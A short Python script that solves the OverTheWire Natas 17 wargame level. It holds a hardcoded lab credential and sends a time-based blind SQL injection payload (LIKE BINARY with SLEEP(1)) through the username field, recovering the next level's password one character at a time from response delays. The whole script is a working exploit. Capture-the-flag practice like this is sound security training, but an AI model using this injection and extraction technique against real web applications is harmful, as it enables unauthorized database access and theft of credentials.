import requests
import os,sys
from string import *
from time import *

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_letters + digits
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):
	for ch in characters:
		start_time = time()
		print("Trying char :" , "".join(seen_password) + ch ) 
		query = 'natas18" AND password LIKE BINARY "' + "".join(seen_password) + ch +'%" AND SLEEP(1) #'
		response = session.post(url , data = { "username" : query } , auth=(username,password))
		content = response.text
		end_time = time()
		diff = end_time - start_time
		if (diff > 1):
			seen_password.append(ch)
		os.system(cmd)

flag = "".join(seen_password)
print("[+] Gotcha ",flag)

		